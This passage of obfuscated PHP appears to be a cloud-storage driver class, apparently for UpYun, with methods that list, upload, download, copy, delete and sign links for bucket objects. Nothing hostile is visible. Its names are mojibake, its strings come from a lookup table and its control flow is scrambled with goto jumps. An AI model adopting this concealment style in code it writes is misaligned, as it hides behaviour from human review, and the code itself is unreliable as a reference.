isset($fÃµ¢±ºÑ¤[$a¨‹Î”Ç˜ò[1355]])) { $fÃµ¢±ºÑ¤ = $fÃµ¢±ºÑ¤[$a¨‹Î”Ç˜ò[1355]]; } } } return array($a¨‹Î”Ç˜ò[1107] => $dÁáÙˆ¥«ù[$a¨‹Î”Ç˜ò[733]], $a¨‹Î”Ç˜ò[1109] => $fÃµ¢±ºÑ¤); goto FİÉïôÖ‹å; D¨½Ì˜£¥: $fÎßÌÖ¯òé = $this->ussHeaders($A³ÊÊÓˆ¡Û, $B¤½çˆµ‚); if ($Fò«àÁÎÏç) { $fÎßÌÖ¯òé = array_merge($fÎßÌÖ¯òé, $Fò«àÁÎÏç); } $dÁáÙˆ¥«ù = url_request($this->endpoint . $A³ÊÊÓˆ¡Û, $B¤½çˆµ‚, $fÃµ¢±ºÑ¤, $fÎßÌÖ¯òé, $fò®íˆÎœÄ); goto F¢°Ø„‘Ê¬; a™«ë‚¯: $a¨‹Î”Ç˜ò =& $_SERVER[ä°„ä°º]; $D‰ğ¿Æ‘ï„ = trim($D‰ğ¿Æ‘ï„, $a¨‹Î”Ç˜ò[8]); $A³ÊÊÓˆ¡Û = "\x2f{$this->bucket}\57{$D‰ğ¿Æ‘ï„}"; goto D¨½Ì˜£¥; FİÉïôÖ‹å: } public function mkfile($DèŸÀ§ËÍÅ, $AÁ†å‹ØÌŠ = '', $Då—ÍêÚîº = REPEAT_RENAME) { if ($this->setContent($DèŸÀ§ËÍÅ, $AÁ†å‹ØÌŠ)) { return $this->getPathOuter($DèŸÀ§ËÍÅ); } return !1; } public function mkdir($DæëŠÈæ½Š, $d–‚¡À• = REPEAT_SKIP) { $aœ‘Ù°àƒĞ =& $_SERVER[ä°„ä°º]; $e‰‡ŒÁÛ‰‡ = trim($DæëŠÈæ½Š, $aœ‘Ù°àƒĞ[8]); if ($this->_isFolder($e‰‡ŒÁÛ‰‡)) { return $this->getPathOuter($e‰‡ŒÁÛ‰‡); } $Cîíö¶¾’ = array($aœ‘Ù°àƒĞ[1356]); $a£Æ®¼·ìÂ = $this->ussRequest($e‰‡ŒÁÛ‰‡, $aœ‘Ù°àƒĞ[224], !1, $Cîíö¶¾’); return $a£Æ®¼·ìÂ[$aœ‘Ù°àƒĞ[1107]] ? $this->getPathOuter($e‰‡ŒÁÛ‰‡) : !1; } public function copyFile($a¨ä‹ÊŸÁÌ, $F±÷³è’”’) { $bÌ¨¨×²Äİ =& $_SERVER[ä°„ä°º]; $bÇŸÊ¸äğ¢ = array($bÌ¨¨×²Äİ[1357] . "\57{$this->bucket}\57{$a¨ä‹ÊŸÁÌ}", $bÌ¨¨×²Äİ[1358]); $a•¤Şš¥ƒ = $this->ussRequest($F±÷³è’”’, $bÌ¨¨×²Äİ[226], !1, $bÇŸÊ¸äğ¢); return $a•¤Şš¥ƒ[$bÌ¨¨×²Äİ[1107]] ? !0 : $this->getPathOuter($F±÷³è’”’); } public function moveFile($c‚Æõø±íˆ, $CÍ»ƒ™ãâÁ) { $FˆÃ»ªö« =& $_SERVER[ä°„ä°º]; $cÀƒ¡ñÌÆ = array($FˆÃ»ªö«[1359] . "\x2f{$this->bucket}\57{$c‚Æõø±íˆ}", $FˆÃ»ªö«[1358]); $E¯šÙİ¿Ï = $this->ussRequest($CÍ»ƒ™ãâÁ, $FˆÃ»ªö«[226], !1, $cÀƒ¡ñÌÆ); return $E¯šÙİ¿Ï[$FˆÃ»ªö«[1107]] ? !0 : $this->getPathOuter($CÍ»ƒ™ãâÁ); } public function delFile($b„ŞÌ†Íƒ†) { $eÇÕÎ…í¦Ÿ =& $_SERVER[ä°„ä°º]; $b¸Œ¢·¨Ïì = $this->ussRequest($b„ŞÌ†Íƒ†, $eÇÕÎ…í¦Ÿ[1360]); return $b¸Œ¢·¨Ïì[$eÇÕÎ…í¦Ÿ[1107]] ? !0 : !1; } public function delFolder($e±¦˜§ƒµÂ) { goto E×ÄÀÂõ÷è; aËÉ›Ï„°²: foreach ($F×¹ÉÜ ‹Ó as $cÅÛª¹ª‘) { $AŒ‚êî·ß“ = $this->ussRequest($cÅÛª¹ª‘[$aÏùÀ¢ê©£[28]], $aÏùÀ¢ê©£[1360]); if (!$AŒ‚êî·ß“[$aÏùÀ¢ê©£[1107]]) { return !1; } } foreach ($C¼«‚İõÊí as $CĞ¢è¯‘£ù) { $AŒ‚êî·ß“ = $this->ussRequest($CĞ¢è¯‘£ù, $aÏùÀ¢ê©£[1360]); if (!$AŒ‚êî·ß“[$aÏùÀ¢ê©£[1107]]) { return !1; } } $AŒ‚êî·ß“ = $this->ussRequest($e±¦˜§ƒµÂ, $aÏùÀ¢ê©£[1360]); goto f»¾ÕŒ”â; bİÂ…Ê‚: $C¼«‚İõÊí = $F×¹ÉÜ ‹Ó = array(); $this->fileList($e±¦˜§ƒµÂ, $C¼«‚İõÊí, $F×¹ÉÜ ‹Ó, !0); $this->listItemCache = !0; goto aËÉ›Ï„°²; E×ÄÀÂõ÷è: $aÏùÀ¢ê©£ =& $_SERVER[ä°„ä°º]; if (!$this->exist($e±¦˜§ƒµÂ)) { return !0; } $this->listItemCache = !1; goto bİÂ…Ê‚; f»¾ÕŒ”â: return $AŒ‚êî·ß“[$aÏùÀ¢ê©£[1107]]; goto E‘‰ßÅÜ¬¼; E‘‰ßÅÜ¬¼: } public function rename($aâäŒôİš, $AÊ“·°œ‰) { if ($this->isFile($aâäŒôİš)) { $AÊ“·°œ‰ = get_path_father($aâäŒôİš) . $AÊ“·°œ‰; return $this->moveFile($aâäŒôİš, $AÊ“·°œ‰); } return $this->renameObject($aâäŒôİš, $AÊ“·°œ‰); } public function fileInfo($e¥ùìÈè•¡, $AÃõÊ±¨Ë = false, $Bã„ö£Šßƒ = array()) { goto EøÔÃ‹˜¦°; EøÔÃ‹˜¦°: $fâÆÙê‰óî =& $_SERVER[ä°„ä°º]; $aãÌõ‹ÏÜ­ = array($fâÆÙê‰óî[28] => $this->pathThis($e¥ùìÈè•¡), $fâÆÙê‰óî[76] => $this->getPathOuter($fâÆÙê‰óî[8] . $e¥ùìÈè•¡), $fâÆÙê‰óî[29] => $fâÆÙê‰óî[193], $fâÆÙê‰óî[78] => isset($Bã„ö£Šßƒ[$fâÆÙê‰óî[78]]) ? $Bã„ö£Šßƒ[$fâÆÙê‰óî[78]] : 0, $fâÆÙê‰óî[168] => $this->ext($e¥ùìÈè•¡)); if ($AÃõÊ±¨Ë) { return $aãÌõ‹ÏÜ­; } goto aß“ÚªÛİœ; b¸°„ÆêÌ: $aãÌõ‹ÏÜ­[$fâÆÙê‰óî[194]] = intval($Bã„ö£Šßƒ[$fâÆÙê‰óî[1361]]); $aãÌõ‹ÏÜ­[$fâÆÙê‰óî[84]] = intval($Bã„ö£Šßƒ[$fâÆÙê‰óî[1362]]); $aãÌõ‹ÏÜ­[$fâÆÙê‰óî[78]] = $Bã„ö£Šßƒ[$fâÆÙê‰óî[78]]; goto aºÛÖÆè¥; aºÛÖÆè¥: return $aãÌõ‹ÏÜ­; goto B…Ñ´ÖŞé¾; aß“ÚªÛİœ: $aãÌõ‹ÏÜ­[$fâÆÙê‰óî[194]] = $aãÌõ‹ÏÜ­[$fâÆÙê‰óî[84]] = 0; $aãÌõ‹ÏÜ­[$fâÆÙê‰óî[195]] = $aãÌõ‹ÏÜ­[$fâÆÙê‰óî[196]] = !0; if (empty($Bã„ö£Šßƒ)) { $Bã„ö£Šßƒ = $this->objectMeta($e¥ùìÈè•¡); if (!$Bã„ö£Šßƒ) { return $aãÌõ‹ÏÜ­; } } goto b¸°„ÆêÌ; B…Ñ´ÖŞé¾: } public function folderInfo($eèµğ¼¢ßê, $cÏé¢¥µÑÚ = false) { goto d„ÚŸ÷‚æÎ; d„ÚŸ÷‚æÎ: $dÇ¾óé‘‘î =& $_SERVER[ä°„ä°º]; $A‰‚˜¶ãìµ = array($dÇ¾óé‘‘î[28] => $this->pathThis($eèµğ¼¢ßê), $dÇ¾óé‘‘î[76] => $this->getPathOuter($dÇ¾óé‘‘î[8] . $eèµğ¼¢ßê), $dÇ¾óé‘‘î[29] => $dÇ¾óé‘‘î[77]); if ($cÏé¢¥µÑÚ) { return $A‰‚˜¶ãìµ; } goto Fë×ğ‡¹Ïß; añ§„œ²Ä¯: $A‰‚˜¶ãìµ[$dÇ¾óé‘‘î[194]] = intval($dé¥ °°å[$dÇ¾óé‘‘î[1361]]); $A‰‚˜¶ãìµ[$dÇ¾óé‘‘î[84]] = intval($dé¥ °°å[$dÇ¾óé‘‘î[1362]]); return $A‰‚˜¶ãìµ; goto f¨õïª‰é; Fë×ğ‡¹Ïß: $A‰‚˜¶ãìµ[$dÇ¾óé‘‘î[194]] = $A‰‚˜¶ãìµ[$dÇ¾óé‘‘î[84]] = 0; $A‰‚˜¶ãìµ[$dÇ¾óé‘‘î[195]] = $A‰‚˜¶ãìµ[$dÇ¾óé‘‘î[196]] = !0; if (empty($dé¥ °°å)) { $dé¥ °°å = $this->objectMeta($eèµğ¼¢ßê); if (!$dé¥ °°å) { return $A‰‚˜¶ãìµ; } } goto añ§„œ²Ä¯; f¨õïª‰é: } private function listObjs($a„İ‘Àé‰, $f·‡ŞßŠï = 0, $cÅ¿¦Å£ò¾ = 1000) { $FÇÌ ÜÅ±Ã =& $_SERVER[ä°„ä°º]; $E¨Å¼ÏÙÎ… = array($FÇÌ ÜÅ±Ã[1363], $FÇÌ ÜÅ±Ã[1364] . $cÅ¿¦Å£ò¾); if ($f·‡ŞßŠï) { $E¨Å¼ÏÙÎ…[] = $FÇÌ ÜÅ±Ã[1365] . $f·‡ŞßŠï; } $AŒìÇÕÇ¦‡ = $this->ussRequest($a„İ‘Àé‰, $FÇÌ ÜÅ±Ã[228], !1, $E¨Å¼ÏÙÎ…); return !$AŒìÇÕÇ¦‡[$FÇÌ ÜÅ±Ã[1107]] ? !1 : $AŒìÇÕÇ¦‡[$FÇÌ ÜÅ±Ã[1109]]; } private function fileList($b¨íâ¡­Œ‰, &$f¡¦Ù˜Ä, &$A’¼”ƒô‡, $D÷µ¯É‹¼ä = false) { goto EŞ¬Ø¤ÏçÚ; EŞ¬Ø¤ÏçÚ: $B˜£¢ÙŞ¡£ =& $_SERVER[ä°„ä°º]; $då÷Ê¥Êæî = $B˜£¢ÙŞ¡£[33]; $BàŒƒ¥°À´ = 1000; goto bÌ¿äÛÑè; bÌ¿äÛÑè: $FôÑİ¸Õâ½ = rtrim($b¨íâ¡­Œ‰, $B˜£¢ÙŞ¡£[8]) . $B˜£¢ÙŞ¡£[8]; $c¼•Š†•ø = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $c§ÂêÚŒÖ® = $this->listObjs($b¨íâ¡­Œ‰, $då÷Ê¥Êæî, $BàŒƒ¥°À´); if (!$c§ÂêÚŒÖ®) { return !1; } $då÷Ê¥Êæî = isset($c§ÂêÚŒÖ®[$B˜£¢ÙŞ¡£[1366]]) ? $c§ÂêÚŒÖ®[$B˜£¢ÙŞ¡£[1366]] : $B˜£¢ÙŞ¡£[33]; $D‰¿‘Ã¾Õœ = isset($c§ÂêÚŒÖ®[$B˜£¢ÙŞ¡£[1367]]) ? $c§ÂêÚŒÖ®[$B˜£¢ÙŞ¡£[1367]] : array(); foreach ($D‰¿‘Ã¾Õœ as $aÀÑì¾×ÙÛ) { $c¾›®èÙ½º = $aÀÑì¾×ÙÛ[$B˜£¢ÙŞ¡£[29]] == $B˜£¢ÙŞ¡£[77] ? !0 : !1; $aëÃÙçâöÈ = ltrim($FôÑİ¸Õâ½ . $aÀÑì¾×ÙÛ[$B˜£¢ÙŞ¡£[28]], $B˜£¢ÙŞ¡£[8]) . ($c¾›®èÙ½º ? $B˜£¢ÙŞ¡£[8] : $B˜£¢ÙŞ¡£[33]); $aè…ÕîÈÊ‘ = array($B˜£¢ÙŞ¡£[28] => $aëÃÙçâöÈ, $B˜£¢ÙŞ¡£[29] => $c¾›®èÙ½º ? $B˜£¢ÙŞ¡£[77] : $B˜£¢ÙŞ¡£[193], $B˜£¢ÙŞ¡£[78] => $aÀÑì¾×ÙÛ[$B˜£¢ÙŞ¡£[335]], $B˜£¢ÙŞ¡£[1362] => $aÀÑì¾×ÙÛ[$B˜£¢ÙŞ¡£[1368]]); if ($c¼•Š†•ø) { $this->cacheMethod($B˜£¢ÙŞ¡£[199], $aëÃÙçâöÈ, $c¾›®èÙ½º); $this->cacheMethod($B˜£¢ÙŞ¡£[200], $aëÃÙçâöÈ, $aè…ÕîÈÊ‘); } if ($c¾›®èÙ½º) { $f¡¦Ù˜Ä[] = $aëÃÙçâöÈ; if ($D÷µ¯É‹¼ä) { $this->fileList($aëÃÙçâöÈ, $f¡¦Ù˜Ä, $A’¼”ƒô‡, $D÷µ¯É‹¼ä); } continue; } $A’¼”ƒô‡[] = $aè…ÕîÈÊ‘; } if (count($D‰¿‘Ã¾Õœ) < $BàŒƒ¥°À´) { break; } } goto cˆÍÚèçËá; cˆÍÚèçËá: if ($c¼•Š†•ø) { $this->cacheMethod($B˜£¢ÙŞ¡£[199], $b¨íâ¡­Œ‰, !0); } goto e³ÉãôíÔ™; e³ÉãôíÔ™: } public function listPath($dëƒ‰òïè‘, $fŒ‹­Î•Å = false) { $fÚ–…Ä­Æ½ =& $_SERVER[ä°„ä°º]; $Bµ–‚¤õ†‚ = $CëŒ”ÑÈÌ¤ = array(); $this->fileList($dëƒ‰òïè‘, $Bµ–‚¤õ†‚, $CëŒ”ÑÈÌ¤); foreach ($Bµ–‚¤õ†‚ as $Aä„ª‡Üê“ => $eå£é‹¢ˆ¼) { $Bµ–‚¤õ†‚[$Aä„ª‡Üê“] = $this->folderInfo($eå£é‹¢ˆ¼, $fŒ‹­Î•Å); } foreach ($CëŒ”ÑÈÌ¤ as $Aä„ª‡Üê“ => $eå£é‹¢ˆ¼) { $CëŒ”ÑÈÌ¤[$Aä„ª‡Üê“] = $this->fileInfo($eå£é‹¢ˆ¼[$fÚ–…Ä­Æ½[28]], $fŒ‹­Î•Å, $eå£é‹¢ˆ¼); } return array($fÚ–…Ä­Æ½[75] => $Bµ–‚¤õ†‚, $fÚ–…Ä­Æ½[74] => $CëŒ”ÑÈÌ¤); } public function has($Aİ‰È‡®ÎÀ, $fİÓùç†‰ì = false, $C÷¢‰Ì” = true) { goto Bù†»í×·¬; aºÑ„ØÉ¯‹: $AîßÅŒòùŞ = 0; $fùªµÖ¯¥º = 0; $DïÕÑõà¼‘ = rtrim($Aİ‰È‡®ÎÀ, $e§Å¿’ÀŠë[8]) . $e§Å¿’ÀŠë[8]; goto c¤”ã’‹ğ; c¤”ã’‹ğ: while (!0) { check_abort(); $BÊ¢½±ØáÖ = $this->listObjs($Aİ‰È‡®ÎÀ, $FŞ„‘£Ì·, $a‡À‚Ú–Ê); if (!$BÊ¢½±ØáÖ) { return !1; } $FŞ„‘£Ì· = isset($BÊ¢½±ØáÖ[$e§Å¿’ÀŠë[1366]]) ? $BÊ¢½±ØáÖ[$e§Å¿’ÀŠë[1366]] : $e§Å¿’ÀŠë[33]; $F‡åÜÅ–ê™ = isset($BÊ¢½±ØáÖ[$e§Å¿’ÀŠë[1367]]) ? $BÊ¢½±ØáÖ[$e§Å¿’ÀŠë[1367]] : array(); if (empty($F‡åÜÅ–ê™)) { break; } $Dæ¢…ßœó = array_filter($F‡åÜÅ–ê™, function ($Cñ¶¼Ï–«„) { $E‘®ÌÙÚ» =& $_SERVER[ä°„ä°º]; return $Cñ¶¼Ï–«„[$E‘®ÌÙÚ»[29]] == $E‘®ÌÙÚ»[77]; }); $B¼¬·àËêÁ = count($F‡åÜÅ–ê™); $Dæ¢…ßœó = count($Dæ¢…ßœó); $Aç…ßÑ¤” = $B¼¬·àËêÁ - $Dæ¢…ßœó; if ($fİÓùç†‰ì) { $fùªµÖ¯¥º += $Dæ¢…ßœó; $AîßÅŒòùŞ += $Aç…ßÑ¤”; if ($B¼¬·àËêÁ < $a‡À‚Ú–Ê) { break; } continue; } if ($C÷¢‰Ì”) { if ($Aç…ßÑ¤”) { return !0; } } else { if ($Dæ¢…ßœó) { return !0; } } if ($B¼¬·àËêÁ < $a‡À‚Ú–Ê) { break; } } if ($fİÓùç†‰ì) { return array($e§Å¿’ÀŠë[203] => $AîßÅŒòùŞ, $e§Å¿’ÀŠë[204] => $fùªµÖ¯¥º); } return !1; goto Dõ™¶Ä†Û; Bù†»í×·¬: $e§Å¿’ÀŠë =& $_SERVER[ä°„ä°º]; $FŞ„‘£Ì· = $e§Å¿’ÀŠë[33]; $a‡À‚Ú–Ê = 500; goto aºÑ„ØÉ¯‹; Dõ™¶Ä†Û: } public function listAll($A™Ä±‚‹»Î) { goto cå¡ó÷ôã; D±Ğˆ‡×—Œ: return $this->listAllFiles($A™Ä±‚‹»Î, array_keys($eøœùâ–§), $eøœùâ–§); goto b Îµ¿Ñêì; F´çƒÑ¹: $eøœùâ–§ = array(); foreach ($a¥àìòÎ¨ as $B¡á¦“Óç¦) { $eøœùâ–§[$B¡á¦“Óç¦[$f­Ô÷ì‰“×[28]]] = $B¡á¦“Óç¦[$f­Ô÷ì‰“×[78]]; } foreach ($f¤“áŞ¯ as $B¡á¦“Óç¦) { if (is_string($B¡á¦“Óç¦)) { $eøœùâ–§[$B¡á¦“Óç¦] = 0; } } goto D±Ğˆ‡×—Œ; cå¡ó÷ôã: $f­Ô÷ì‰“× =& $_SERVER[ä°„ä°º]; $f¤“áŞ¯ = $a¥àìòÎ¨ = array(); $this->fileList($A™Ä±‚‹»Î, $f¤“áŞ¯, $a¥àìòÎ¨, !0); goto F´çƒÑ¹; b Îµ¿Ñêì: } public function canRead($eçÎ§ ÂÙ) { return $this->exist($eçÎ§ ÂÙ) ? !0 : !1; } public function canWrite($BÁ¸ŠğĞÜÙ) { return $this->exist($BÁ¸ŠğĞÜÙ) ? !0 : !1; } public function getContent($Aà‡ÎÚá) { return $this->fileSubstr($Aà‡ÎÚá, 0, -1); } public function setContent($e¤é‹²·öÎ, $cß‹ãÉ¡‡¢ = '') { $Cô“è™ä‡ =& $_SERVER[ä°„ä°º]; if (!$cß‹ãÉ¡‡¢) { $DèİëÛÎĞ‘ = $this->ussRequest($e¤é‹²·öÎ, $Cô“è™ä‡[224]); return $DèİëÛÎĞ‘[$Cô“è™ä‡[1107]]; } $EáÙÏ±×Ğ¬ = $this->tempFile($this->pathThis($e¤é‹²·öÎ)); file_put_contents($EáÙÏ±×Ğ¬, $cß‹ãÉ¡‡¢); if ($this->upload($e¤é‹²·öÎ, $EáÙÏ±×Ğ¬)) { $this->tempFileRemve($EáÙÏ±×Ğ¬); return !0; } return !1; } public function fileSubstr($DÊ´ÏàñÎæ, $c­­®ßÄ¤, $b‹­øĞ“˜ô) { $C˜½¬Ü¿½ =& $_SERVER[ä°„ä°º]; if (!($e”âÊÌùŞ  = $this->link($DÊ´ÏàñÎæ))) { return !1; } $eô‡ÃË»– = !1; if ($b‹­øĞ“˜ô > 0) { $Cã©‚†ìªº = $c­­®ßÄ¤ + $b‹­øĞ“˜ô - 1; $eô‡ÃË»– = array($C˜½¬Ü¿½[1329] . $c­­®ßÄ¤ . $C˜½¬Ü¿½[440] . $Cã©‚†ìªº); } $då¤á³ä°Ü = url_request($e”âÊÌùŞ , $C˜½¬Ü¿½[228], !1, $eô‡ÃË»–); return $då¤á³ä°Ü[$C˜½¬Ü¿½[733]] ? $då¤á³ä°Ü[$C˜½¬Ü¿½[1109]] : !1; } public function upload($Eç­„Íî², $dÜ°Ü¿ ®¶, $e—îÕ¬ªğ = false, $EÊ£ŸŠÈ¸ = REPEAT_REPLACE) { goto F’Í²ñí„ø; bˆŞáµ¦¥: do { $b Ç¤Ãƒ‘ = $a”¥Œ¤®¢ï[$c›ÒÈÒÆ‚”[1375]]; fseek_64($F•ä¿Ôñ©», $bòÓŞÀ¤ê); $a‚«„ÃÚŒ = fread($F•ä¿Ôñ©», $b Ç¤Ãƒ‘); $dÖñ‘ñ®» = 0; do { $dÖñ‘ñ®»++; $a”¥Œ¤®¢ï = $this->uploadPart($Eç­„Íî², $a”¥Œ¤®¢ï, $a‚«„ÃÚŒ); } while (!$a”¥Œ¤®¢ï && $dÖñ‘ñ®» < 3); if (!$a”¥Œ¤®¢ï) { return !1; } $c«‰² ìğ† = $a”¥Œ¤®¢ï[$c›ÒÈÒÆ‚”[1374]]; $bòÓŞÀ¤ê += $b Ç¤Ãƒ‘; } while ($c«‰² ìğ† != -1); fclose($F•ä¿Ôñ©»); $f»Ñ˜ºà­İ = array($c›ÒÈÒÆ‚”[1376], $c›ÒÈÒÆ‚”[1377] . $a”¥Œ¤®¢ï[$c›ÒÈÒÆ‚”[1378]], $c›ÒÈÒÆ‚”[1372]); goto C”˜‰ùÚØĞ; fÜ Ø…ô¨Á: $b¤Î¦”×õÜ = 1024 * 1024 * 10; $f»Ñ˜ºà­İ = array($c›ÒÈÒÆ‚”[1370], $c›ÒÈÒÆ‚”[1371] . $cöˆ±£Şæì, $c›ÒÈÒÆ‚”[1372], $c›ÒÈÒÆ‚”[1373] . $b¤Î¦”×õÜ); $D—ìÇàãÀÁ = $this->ussRequest($Eç­„Íî², $c›ÒÈÒÆ‚”[226], !1, $f»Ñ˜ºà­İ); goto Fôèİ¯Íë; F’Í²ñí„ø: $c›ÒÈÒÆ‚” =& $_SERVER[ä°„ä°º]; $cöˆ±£Şæì = IO::size($dÜ°Ü¿ ®¶); if ($cöˆ±£Şæì <= 1024 * 1024 * 200) { $a¨‰Ç˜í£ = array($c›ÒÈÒÆ‚”[1369] . $dÜ°Ü¿ ®¶); $D—ìÇàãÀÁ = $this->ussRequest($Eç­„Íî², $c›ÒÈÒÆ‚”[226], $a¨‰Ç˜í£); return $D—ìÇàãÀÁ[$c›ÒÈÒÆ‚”[1107]] ? $this->getPathOuter($Eç­„Íî²) : !1; } goto fÜ Ø…ô¨Á; c„ÖÜ„©Ì: $c«‰² ìğ† = $a”¥Œ¤®¢ï[$c›ÒÈÒÆ‚”[1374]]; $F•ä¿Ôñ©» = fopen($dÜ°Ü¿ ®¶, $c›ÒÈÒÆ‚”[1280]); if (!$F•ä¿Ôñ©») { return !1; } goto bˆŞáµ¦¥; C”˜‰ùÚØĞ: $D—ìÇàãÀÁ = $this->ussRequest($Eç­„Íî², $c›ÒÈÒÆ‚”[226], !1, $f»Ñ˜ºà­İ); return $D—ìÇàãÀÁ[$c›ÒÈÒÆ‚”[1107]] ? $this->getPathOuter($C¿Ó³³Û°Í) : !1; goto AÑÀğíéœ; Fôèİ¯Íë: if (!$D—ìÇàãÀÁ[$c›ÒÈÒÆ‚”[1107]]) { return !1; } $a”¥Œ¤®¢ï = $D—ìÇàãÀÁ[$c›ÒÈÒÆ‚”[1109]]; $bòÓŞÀ¤ê = 0; goto c„ÖÜ„©Ì; AÑÀğíéœ: } private function uploadPart($féè§º’Ä, $dáù“Şçª, &$B¨ö‘ÆÄÒÑ) { $f²µ˜•³Š• =& $_SERVER[ä°„ä°º]; $A‹…ô¨–¿õ = array($f²µ˜•³Š•[1379], $f²µ˜•³Š•[1377] . $dáù“Şçª[$f²µ˜•³Š•[1378]], $f²µ˜•³Š•[1380] . $dáù“Şçª[$f²µ˜•³Š•[1374]], $f²µ˜•³Š•[141] . $dáù“Şçª[$f²µ˜•³Š•[1375]]); $d˜«¡„æÎ = $this->ussRequest($féè§º’Ä, $f²µ˜•³Š•[226], $B¨ö‘ÆÄÒÑ, $A‹…ô¨–¿õ); return !$d˜«¡„æÎ[$f²µ˜•³Š•[1107]] ? $d˜«¡„æÎ[$f²µ˜•³Š•[1107]] : $d˜«¡„æÎ[$f²µ˜•³Š•[1109]]; } public function uploadFormData($b•·Æõ‡˜, $A‚¶•ùŸ¡Á = 3600) { return $this->uploadPolicy($b•·Æõ‡˜, $A‚¶•ùŸ¡Á); } public function multiUploadFormData($eÄšøÄØ›, $CÕ¾–˜’õ = 3600) { $e±¯çµ¶È‡ =& $_SERVER[ä°„ä°º]; $b©ø¨¨›ˆ = (int) $GLOBALS[$e±¯çµ¶È‡[7]][$e±¯çµ¶È‡[78]]; return $this->uploadPolicy($eÄšøÄØ›, $CÕ¾–˜’õ, $b©ø¨¨›ˆ); } private function uploadPolicy($aÅ¦Ú¶áÄ, $eÇå¨ŒÜÏ£ = 3600, $AøºÉß­Ì÷ = 0) { goto FÁ†°Æãìë; FÁ†°Æãìë: $aÍ–¬¿¼ªÑ =& $_SERVER[ä°„ä°º]; $a¯µšŸ—ß = $aÍ–¬¿¼ªÑ[8] . $this->bucket; $EÕƒ‚ïù• = gmdate($aÍ–¬¿¼ªÑ[1316]); goto fš¶ì×¾Ïğ; f¤Ô©§¼Ğ›: $Bœš§Ğã = base64_encode(hash_hmac($aÍ–¬¿¼ªÑ[1351], "\x50\x4f\123\124\x26{$a¯µšŸ—ß}\x26{$EÕƒ‚ïù•}\x26{$d«ÖòÏÆ­ë}", md5("{$this->userpass}"), !0)); $Cµ«¼ÏÑ£ = array($aÍ–¬¿¼ªÑ[1222] => $d«ÖòÏÆ­ë, $aÍ–¬¿¼ªÑ[1385] => "\125\x50\131\x55\116\x20{$this->username}\72{$Bœš§Ğã}", $aÍ–¬¿¼ªÑ[175] => $this->endpoint . $a¯µšŸ—ß); return $Cµ«¼ÏÑ£; goto bÁğ¬ïí£; fš¶ì×¾Ïğ: $AÇ·˜ğé†ù = array($aÍ–¬¿¼ªÑ[1381] => $this->bucket, $aÍ–¬¿¼ªÑ[1382] => $aÅ¦Ú¶áÄ, $aÍ–¬¿¼ªÑ[1383] => time() + $eÇå¨ŒÜÏ£, $aÍ–¬¿¼ªÑ[1384] => $EÕƒ‚ïù•); if ($AøºÉß­Ì÷) { $AÇ·˜ğé†ù[$aÍ–¬¿¼ªÑ[1296]] = $AøºÉß­Ì÷; } $d«ÖòÏÆ­ë = base64_encode(json_encode($AÇ·˜ğé†ù)); goto f¤Ô©§¼Ğ›; bÁğ¬ïí£: } public function download($e ì§µ±ô”, $f’Á‡¤óÓ¡) { goto bµîîÑŞƒ; AŒÜè˜¦±³: $cÊÖ‡¦¥ÑÓ = 1024 * 200; $d©Àæ×ŸÅù = fopen($D¨›í¿Ô–ñ, $_SERVER[ä°„ä°º][1335]); while (!0) { $C³¾Ë”ç = $this->fileSubstr($e ì§µ±ô”, $e„éÜ˜ä…Û, $cÊÖ‡¦¥ÑÓ); if ($C³¾Ë”ç === !1) { return !1; } fwrite($d©Àæ×ŸÅù, $C³¾Ë”ç); $e„éÜ˜ä…Û += $cÊÖ‡¦¥ÑÓ; if (strlen($C³¾Ë”ç) < $cÊÖ‡¦¥ÑÓ) { break; } } goto cò÷šáÚîÉ; bµîîÑŞƒ: $D¨›í¿Ô–ñ = IO::getPathInner(IO::mkfile($f’Á‡¤óÓ¡)); if (!($D«¦¿ÔŒØ = $this->link($e ì§µ±ô”))) { return !1; } $e„éÜ˜ä…Û = 0; goto AŒÜè˜¦±³; cò÷šáÚîÉ: fclose($d©Àæ×ŸÅù); return $f’Á‡¤óÓ¡; goto cÀÅš¥¨Üº; cÀÅš¥¨Üº: } public function link($A–¦®å¶¶š, $F¾óÔÓë«¾ = array()) { $EŞƒ™ìİ± =& $_SERVER[ä°„ä°º]; $A–¦®å¶¶š = trim($A–¦®å¶¶š, $EŞƒ™ìİ±[8]); if (!empty($this->token)) { $dÜ¦ß°µèğ = strtotime(date($EŞƒ™ìİ±[1386])); $BÑ¥‹ªåŞÀ = substr(md5($this->token . $EŞƒ™ìİ±[282] . $dÜ¦ß°µèğ . $EŞƒ™ìİ±[1387] . $A–¦®å¶¶š), 12, 8) . $dÜ¦ß°µèğ; $F¾óÔÓë«¾[] = $EŞƒ™ìİ±[1388] . $BÑ¥‹ªåŞÀ; } $fÛÇÍ¹¥çÆ = !empty($F¾óÔÓë«¾) ? $EŞƒ™ìİ±[70] . implode($EŞƒ™ìİ±[282], $F¾óÔÓë«¾) : $EŞƒ™ìİ±[33]; return $this->getHost() . $EŞƒ™ìİ±[8] . $A–¦®å¶¶š . $fÛÇÍ¹¥çÆ; } public function fileOut($dÃÎÕ¶¨÷ğ, $aŠİøŞŒÎ¼ = false, $aó‘„©¹Ü = false, $E›ó‰ÕÆšœ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($dÃÎÕ¶¨÷ğ, $aŠİøŞŒÎ¼, $aó‘„©¹Ü, $E›ó‰ÕÆšœ); } if (!$aó‘„©¹Ü) { $aó‘„©¹Ü = $this->pathThis($dÃÎÕ¶¨÷ğ); } $BÖç‡Ä–ìà = $aŠİøŞŒÎ¼ ? array($_SERVER[ä°„ä°º][1389] . rawurlencode($aó‘„©¹Ü)) : array(); $e•¯¸õÀí = $this->link($dÃÎÕ¶¨÷ğ, $BÖç‡Ä–ìà); $this->fileOutLink($e•¯¸õÀí); } public function fileOutServer($dö•äÛ§ô—, $d¤­ºÁÓÔ = false, $d‰œŠó“‡ô = false, $A¸’áŠ‰î = '') { parent::fileOut($dö•äÛ§ô—, $d¤­ºÁÓÔ, $d‰œŠó“‡ô, $A¸’áŠ‰î); } public function fileOutImage($Fõ²äËÃ¿, $cÓò¥·ÂñŒ = 250) { $FÇ¸‹ÎôÚŠ = $this->link($Fõ²äËÃ¿ . $_SERVER[ä°„ä°º][1390] . $cÓò¥·ÂñŒ); $this->fileOutLink($FÇ¸‹ÎôÚŠ); } public function fileOutImageServer($E˜¹‡™¼ù˜, $B…Î½¥‹±§ = 250) { parent::fileOutImage($E˜¹‡™¼ù˜, $B…Î½¥‹±§); } public function hashMd5($FØÕ™÷) { $f° ê§–› =& $_SERVER[ä°„ä°º]; $fƒ¿°¼ğÀ… = $this->_objectMeta($FØÕ™÷); return isset($fƒ¿°¼ğÀ…[$f° 